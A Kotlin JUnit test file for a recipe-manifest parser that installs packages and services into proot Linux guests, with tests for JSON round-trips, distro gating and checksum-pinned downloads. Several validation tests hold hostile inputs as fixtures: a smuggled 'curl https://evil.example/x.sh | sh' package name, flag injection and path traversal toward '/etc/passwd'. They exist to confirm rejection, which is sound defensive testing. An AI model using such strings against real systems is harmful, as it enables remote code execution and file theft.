package sh.haven.core.local.proot

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertThrows
import org.junit.Assert.assertTrue
import org.junit.Test
import java.nio.file.Files

class GuestRecipeManifestTest {

    @Test
    fun `builtIn catalog round-trips through JSON losslessly`() {
        val builtIn = GuestRecipeManifest.builtIn()
        assertTrue(builtIn.packs.isNotEmpty())
        assertTrue(builtIn.services.isNotEmpty())

        val json = GuestRecipeManifest.toJson(builtIn)
        val parsed = GuestRecipeManifest.parse(json)

        assertEquals(builtIn, parsed)
    }

    @Test
    fun `parses community pack and service with arch gating and pinned service asset`() {
        val sha = "a".repeat(64)
        val raw = """
            {
              "schemaVersion": 1,
              "sourceRepo": "https://github.com/GlassHaven/haven-recipes",
              "packs": [
                {
                  "id": "krita",
                  "label": "Krita",
                  "description": "Digital painting studio under Xwayland.",
                  "supportedArches": ["aarch64", "x86_64"],
                  "packages": {
                    "APT": ["krita", "dbus-x11"],
                    "PACMAN": ["krita"]
                  },
                  "verifyBinary": "usr/bin/krita",
                  "configWrites": [
                    {
                      "path": "/root/.config/kritadisplayrc",
                      "stanza": "[OpenGL]\nPreferOpenGL=false"
                    }
                  ],
                  "needsAudioBridge": false,
                  "appLabel": "Krita",
                  "appCommand": "env QT_QPA_PLATFORM=xcb krita",
                  "fullscreen": true,
                  "verifiedFamilies": ["APT"]
                }
              ],
              "services": [
                {
                  "id": "ollama",
                  "label": "Ollama",
                  "description": "Local LLM server on 127.0.0.1:11434.",
                  "port": 11434,
                  "supportedArches": ["aarch64"],
                  "packages": {
                    "APK": ["ca-certificates", "curl", "tar", "zstd"],
                    "APT": ["ca-certificates", "curl", "tar", "zstd"],
                    "PACMAN": ["ollama"]
                  },
                  "verifyBinaries": ["usr/local/bin/ollama", "usr/bin/ollama"],
                  "assets": [
                    {
                      "url": "https://github.com/ollama/ollama/releases/download/v0.6.0/ollama-linux-arm64.tgz",
                      "sha256": "${sha.uppercase()}",
                      "destDir": "/tmp/haven-ollama"
                    }
                  ],
                  "postInstallScript": "if [ ! -x /usr/bin/ollama ]; then tar -xzf /tmp/haven-ollama/ollama-linux-arm64.tgz -C /usr/local; fi",
                  "serviceCommand": "OLLAMA_HOST=127.0.0.1:11434 exec $(command -v ollama) serve",
                  "autostart": false
                }
              ]
            }
        """.trimIndent()

        val manifest = GuestRecipeManifest.parse(raw)
        assertEquals(1, manifest.schemaVersion)
        assertEquals("https://github.com/GlassHaven/haven-recipes", manifest.sourceRepo)

        val krita = manifest.packs.single()
        assertEquals(setOf(Arch.AARCH64, Arch.X86_64), krita.supportedArches)
        val kritaScript = buildPackInstallScript(
            pack = krita,
            pkgs = krita.packages.getValue(PackageFamily.APT),
            family = PackageFamily.APT,
            includeAssets = true,
        )
        assertTrue(kritaScript.startsWith("set -e\n"))
        assertTrue(kritaScript.contains("case \"\$(uname -m)\" in"))
        assertTrue(kritaScript.contains("aarch64|arm64|x86_64|amd64)"))

        val ollama = manifest.services.single()
        assertEquals(setOf(Arch.AARCH64), ollama.supportedArches)
        assertEquals(sha, ollama.assets.single().sha256)
        val ollamaScript = buildServicePresetInstallScript(
            preset = ollama,
            pkgs = ollama.packages.getValue(PackageFamily.APT),
            family = PackageFamily.APT,
        )
        assertTrue(ollamaScript.contains("case \"\$(uname -m)\" in"))
        assertTrue(ollamaScript.contains("aarch64|arm64)"))
        assertFalse(ollamaScript.contains("x86_64"))
        val curlIdx = ollamaScript.indexOf("curl -fsSL --retry 2 -o '/tmp/haven-ollama/ollama-linux-arm64.tgz'")
        val shaIdx = ollamaScript.indexOf("sha256sum -c -")
        val postIdx = ollamaScript.indexOf("tar -xzf /tmp/haven-ollama/ollama-linux-arm64.tgz")
        assertTrue("asset fetch must precede sha256 check and postInstallScript", curlIdx in 0 until shaIdx && shaIdx < postIdx)

        val preview = GuestRecipeManifest.previewServiceInstall(ollama, PackageFamily.APT)
        assertTrue(preview.contains("127.0.0.1:11434"))
        assertTrue(preview.contains("OLLAMA_HOST=127.0.0.1:11434"))
    }

    @Test
    fun `rejects shell or flag injection in package names`() {
        val badShell = minimalPackJson(pkg = "qmmp; curl https://evil.example/x.sh | sh")
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(badShell)
        }

        val badFlag = minimalPackJson(pkg = "--allow-untrusted")
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(badFlag)
        }
    }

    @Test
    fun `rejects host path traversal in verifyBinary and verifyBinaries`() {
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(minimalPackJson(verifyBinary = "../../data/data/sh.haven.app/files/secret"))
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(minimalPackJson(verifyBinary = "/usr/bin/qmmp"))
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(minimalServiceJson(verifyBinary = "usr/bin/../../../etc/passwd"))
        }
    }

    @Test
    fun `rejects cleartext or unpinned assets and path traversal in destDir or configWrites`() {
        val validSha = "b".repeat(64)
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(
                minimalPackJson(
                    assetUrl = "http://archive.org/download/skin.wsz",
                    assetSha = validSha,
                    assetDest = "/root/.qmmp/skins",
                ),
            )
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(
                minimalPackJson(
                    assetUrl = "https://archive.org/download/skin.wsz",
                    assetSha = "1234",
                    assetDest = "/root/.qmmp/skins",
                ),
            )
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(
                minimalPackJson(
                    assetUrl = "https://archive.org/download/skin.wsz?raw=1",
                    assetSha = validSha,
                    assetDest = "/root/.qmmp/skins",
                ),
            )
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(
                minimalPackJson(
                    assetUrl = "https://archive.org/download/skin.wsz",
                    assetSha = validSha,
                    assetDest = "/root/../etc",
                ),
            )
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(
                minimalPackJson(configPath = "/root/../../etc/profile"),
            )
        }
    }

    @Test
    fun `rejects unsupported schemaVersion duplicate ids trailing tokens and duplicate json keys`() {
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse("""{"schemaVersion": 2, "packs": [], "services": []}""")
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse("""{"schemaVersion": 1, "packs": [], "services": []} trailing""")
        }
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse("""{"schemaVersion": 1, "schemaVersion": 1, "packs": [], "services": []}""")
        }
        val dup = """
            {
              "schemaVersion": 1,
              "packs": [
                ${singlePackObject("dup-id")},
                ${singlePackObject("dup-id")}
              ],
              "services": []
            }
        """.trimIndent()
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(dup)
        }
    }

    @Test
    fun `distroRules round-trip and enforce os-release id minVersion and extraPackages in sh`() {
        val raw = """
            {
              "schemaVersion": 1,
              "packs": [
                {
                  "id": "wine-box",
                  "label": "Wine Helper",
                  "description": "Distro-gated pack with t64 vs legacy alsa package split.",
                  "distroRules": [
                    {"osId": "debian", "minVersion": "13", "extraPackages": ["libasound2t64"]},
                    {"osId": "debian", "minVersion": "12", "extraPackages": ["libasound2"]},
                    {"osId": "ubuntu", "minVersion": "24.04", "extraPackages": ["libasound2t64"]}
                  ],
                  "packages": {
                    "APT": ["zenity"]
                  },
                  "verifyBinary": "usr/bin/zenity",
                  "appLabel": "Wine Helper",
                  "appCommand": "zenity --info"
                }
              ],
              "services": [
                {
                  "id": "arch-ollama",
                  "label": "Ollama (Arch)",
                  "description": "CPU Ollama service on Arch Linux.",
                  "port": 11434,
                  "supportedArches": ["aarch64", "x86_64"],
                  "distroRules": [
                    {"osId": "arch"}
                  ],
                  "packages": {
                    "PACMAN": ["ollama"]
                  },
                  "verifyBinaries": ["usr/bin/ollama"],
                  "serviceCommand": "OLLAMA_HOST=127.0.0.1:11434 exec /usr/bin/ollama serve"
                }
              ]
            }
        """.trimIndent()

        val manifest = GuestRecipeManifest.parse(raw)
        assertEquals(manifest, GuestRecipeManifest.parse(GuestRecipeManifest.toJson(manifest)))

        val pack = manifest.packs.single()
        assertEquals(
            listOf(
                DistroRule(osId = "debian", minVersion = "13", extraPackages = listOf("libasound2t64")),
                DistroRule(osId = "debian", minVersion = "12", extraPackages = listOf("libasound2")),
                DistroRule(osId = "ubuntu", minVersion = "24.04", extraPackages = listOf("libasound2t64")),
            ),
            pack.distroRules,
        )
        val preview = GuestRecipeManifest.previewPackInstall(pack, PackageFamily.APT)
        assertTrue(preview.contains("debian >= 13"))
        assertTrue(preview.contains("ubuntu >= 24.04"))

        val guardSb = StringBuilder("set -e\n")
        appendGuestDistroGuard(guardSb, pack.distroRules)
        guardSb.append("printf '%s\\n' \"\$HAVEN_EXTRA_PKGS\"\n")
        val probeScript = guardSb.toString()

        assertEquals(0 to "libasound2t64", runWithOsRelease(probeScript, "ID=debian\nVERSION_ID=\"13\"\n"))
        assertEquals(0 to "libasound2", runWithOsRelease(probeScript, "ID=debian\nVERSION_ID=\"12\"\n"))
        assertEquals(0 to "libasound2t64", runWithOsRelease(probeScript, "ID=ubuntu\nVERSION_ID=\"26.04\"\n"))
        assertEquals(0 to "libasound2t64", runWithOsRelease(probeScript, "ID=ubuntu\nVERSION_ID=\"24.04\"\n"))

        val oldUbuntu = runWithOsRelease(probeScript, "ID=ubuntu\nVERSION_ID=\"22.04\"\n")
        assertEquals(1, oldUbuntu.first)
        assertTrue(oldUbuntu.second.contains("Unsupported guest distro/version: ubuntu 22.04"))

        val oldDebian = runWithOsRelease(probeScript, "ID=debian\nVERSION_ID=\"11\"\n")
        assertEquals(1, oldDebian.first)

        val archGuardSb = StringBuilder("set -e\n")
        appendGuestDistroGuard(archGuardSb, manifest.services.single().distroRules)
        archGuardSb.append("printf 'ok:%s\\n' \"\$HAVEN_EXTRA_PKGS\"\n")
        assertEquals(0 to "ok:", runWithOsRelease(archGuardSb.toString(), "ID=arch\n"))
        assertEquals(1, runWithOsRelease(archGuardSb.toString(), "ID=alpine\nVERSION_ID=3.21.3\n").first)
    }

    @Test
    fun `rejects invalid distroRules osId minVersion or extraPackages`() {
        val badOsId = """
            {"schemaVersion":1,"packs":[],"services":[{"id":"s","label":"S","description":"D","port":80,"distroRules":[{"osId":"ubuntu;id"}],"packages":{"APT":["curl"]},"verifyBinaries":["usr/bin/curl"],"serviceCommand":"curl"}]}
        """.trimIndent()
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(badOsId)
        }

        val badMinVer = """
            {"schemaVersion":1,"packs":[],"services":[{"id":"s","label":"S","description":"D","port":80,"distroRules":[{"osId":"ubuntu","minVersion":"24.04-beta"}],"packages":{"APT":["curl"]},"verifyBinaries":["usr/bin/curl"],"serviceCommand":"curl"}]}
        """.trimIndent()
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(badMinVer)
        }

        val badExtraPkg = """
            {"schemaVersion":1,"packs":[],"services":[{"id":"s","label":"S","description":"D","port":80,"distroRules":[{"osId":"ubuntu","extraPackages":["--allow-untrusted"]}],"packages":{"APT":["curl"]},"verifyBinaries":["usr/bin/curl"],"serviceCommand":"curl"}]}
        """.trimIndent()
        assertThrows(RecipeValidationException::class.java) {
            GuestRecipeManifest.parse(badExtraPkg)
        }
    }

    @Test
    fun `matchesGuestDistro checks rootfs os-release and built-in distro catalog ids`() {
        val rules = listOf(
            DistroRule(osId = "ubuntu", minVersion = "24.04"),
            DistroRule(osId = "debian", minVersion = "13"),
        )
        assertTrue(matchesGuestDistro(emptyList(), "debian-bookworm", null))
        assertTrue(matchesGuestDistro(rules, "ubuntu-noble", null))
        assertTrue(matchesGuestDistro(rules, "ubuntu-resolute-x86_64", null))
        assertTrue(matchesGuestDistro(rules, "debian-trixie", null))
        assertFalse(matchesGuestDistro(rules, "debian-bookworm", null))
        assertFalse(matchesGuestDistro(rules, "alpine-3.21", null))

        val customRootfs = Files.createTempDirectory("haven-rootfs-")
        try {
            val etcDir = customRootfs.resolve("etc")
            Files.createDirectories(etcDir)
            Files.writeString(etcDir.resolve("os-release"), "ID=debian\nVERSION_ID=\"12\"\n")
            assertFalse(matchesGuestDistro(rules, "custom-apt", customRootfs.toFile()))

            Files.writeString(etcDir.resolve("os-release"), "ID=\"ubuntu\"\nVERSION_ID=\"24.04\"\n")
            assertTrue(matchesGuestDistro(rules, "custom-apt", customRootfs.toFile()))
        } finally {
            customRootfs.toFile().deleteRecursively()
        }
    }

    private fun runWithOsRelease(script: String, osReleaseContent: String): Pair<Int, String> {
        val tmp = Files.createTempFile("haven-os-release-", ".conf")
        return try {
            Files.writeString(tmp, osReleaseContent)
            val pb = ProcessBuilder("/bin/sh", "-c", script)
            pb.environment()["HAVEN_OS_RELEASE"] = tmp.toAbsolutePath().toString()
            pb.redirectErrorStream(true)
            val proc = pb.start()
            val out = proc.inputStream.bufferedReader().readText().trim()
            val code = proc.waitFor()
            code to out
        } finally {
            Files.deleteIfExists(tmp)
        }
    }

    private fun singlePackObject(
        id: String = "demo",
        pkg: String = "qmmp",
        verifyBinary: String = "usr/bin/qmmp",
        configPath: String = "/root/.qmmp/qmmprc",
        assetUrl: String? = null,
        assetSha: String? = null,
        assetDest: String? = null,
    ): String {
        val assetBlock = if (assetUrl != null) {
            """"assets": [{"url": "$assetUrl", "sha256": "${assetSha.orEmpty()}", "destDir": "${assetDest.orEmpty()}"}],"""
        } else {
            ""
        }
        return """
            {
              "id": "$id",
              "label": "Demo",
              "description": "Demo pack",
              "packages": {"APT": ["$pkg"]},
              "verifyBinary": "$verifyBinary",
              "configWrites": [{"path": "$configPath", "stanza": "[Output]\ncurrent_plugin=pulse"}],
              $assetBlock
              "appLabel": "Demo",
              "appCommand": "qmmp"
            }
        """.trimIndent()
    }

    private fun minimalPackJson(
        pkg: String = "qmmp",
        verifyBinary: String = "usr/bin/qmmp",
        configPath: String = "/root/.qmmp/qmmprc",
        assetUrl: String? = null,
        assetSha: String? = null,
        assetDest: String? = null,
    ): String = """
        {
          "schemaVersion": 1,
          "packs": [${singlePackObject("demo", pkg, verifyBinary, configPath, assetUrl, assetSha, assetDest)}],
          "services": []
        }
    """.trimIndent()

    private fun minimalServiceJson(
        verifyBinary: String = "usr/sbin/mariadbd",
    ): String = """
        {
          "schemaVersion": 1,
          "packs": [],
          "services": [
            {
              "id": "demo-svc",
              "label": "Demo Service",
              "description": "Demo service",
              "port": 8080,
              "packages": {"APT": ["mariadb-server"]},
              "verifyBinaries": ["$verifyBinary"],
              "serviceCommand": "exec mariadbd"
            }
          ]
        }
    """.trimIndent()
}
